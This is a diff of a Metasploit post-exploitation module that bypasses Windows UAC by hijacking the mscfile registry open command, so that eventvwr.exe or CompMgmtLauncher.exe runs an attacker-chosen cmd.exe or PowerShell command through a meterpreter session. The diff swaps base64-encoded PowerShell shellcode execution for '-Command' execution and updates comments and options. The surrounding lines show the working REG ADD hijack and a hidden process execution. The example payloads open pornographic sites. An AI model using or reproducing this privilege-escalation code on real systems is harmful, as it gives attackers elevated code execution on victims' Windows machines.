@@ -38,15 +38,12 @@
 # The cmd.exe command to be executed (target)  => set EXEC_COMMAND start firefox.exe www.househot.com
 # Check target vulnerability settings/status?  => set CHECK_VULN true
 # Delete malicious registry hive keys/values?  => set DEL_REGKEY true
-# Exec powershell shellcode insted of a cmd?   => set USE_POWERSHELL true
+# Use powershell.exe to execute our command?   => set USE_POWERSHELL true
 # The binary.exe vulnerable?                   => set VULN_SOFT CompMgmtLauncher.exe
 # ---
-# HINT: To deploy a powershell payload (shellcode string) we need to set the option
-# 'USE_POWERSHELL true' and input the base64 encoded 'shellcode' into 'EXEC_COMMAND'
+# HINT: To execute a powershell command we need the follow settings active:
 # EXAMPLE: set USE_POWERSHELL true
-# EXAMPLE: set EXEC_COMMAND ZWNobyAndGVzdCcgPiBjOlx0ZXN0LnR4dAo=
-# HINT: echo 'test' > c:\\test.txt -> ENCODED IN BASE64: ZWNobyAndGVzdCcgPiBjOlx0ZXN0LnR4dAo=
-# HINT: echo "start chrome.exe www.youporn.com" -> IN BASE64: c3RhcnQgY2hyb21lLmV4ZSB3d3cueW91cG9ybi5jb20K
+# EXAMPLE: set EXEC_COMMAND start chrome.exe www.youporn.com
 # ---
 #
 #
@@ -122,7 +119,7 @@ class MetasploitModule < Msf::Post
                                         'Vuln discover: enigma0x3 | mattifestation',  # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.9',
+                        'Version'        => '$Revision: 2.0',
                         'DisclosureDate' => 'mar 16 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -145,7 +142,7 @@ class MetasploitModule < Msf::Post
 			'DefaultOptions' =>
 				{
                                          'SESSION' => '1',             # Default its to run againts session 1
-                                         'VULN_SOFT'=> 'eventvwr.exe', # Default its to run againts eventvwr.exe
+                                         'VULN_SOFT' => 'eventvwr.exe', # Default its to run againts eventvwr.exe
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -161,7 +158,7 @@ class MetasploitModule < Msf::Post
                 register_advanced_options(
                         [
                                 OptString.new('VULN_SOFT', [ false, 'The binary.exe vulnerable (eg CompMgmtLauncher.exe)']),
-                                OptBool.new('USE_POWERSHELL', [ false, 'Execute powershell shellcode insted of a cmd command?' , false]),
+                                OptBool.new('USE_POWERSHELL', [ false, 'Use powershell.exe to execute our command?' , false]),
                                 OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
                         ], self.class) 
 
@@ -191,7 +188,7 @@ end
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
   regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
-  psh_comma = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe -enc" # use_powershell advanced option command
+  psh_comma = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe -Command" # use_powershell advanced option command
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
@@ -259,7 +256,7 @@ end
         end
 
  # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
- # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -enc aDfSjRnGlsgVkGftmoEdD==" /f
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -Command start chrome.exe www.youporn.com" /f
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
  print_good(" exec => Hijacking process to gain code execution...")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
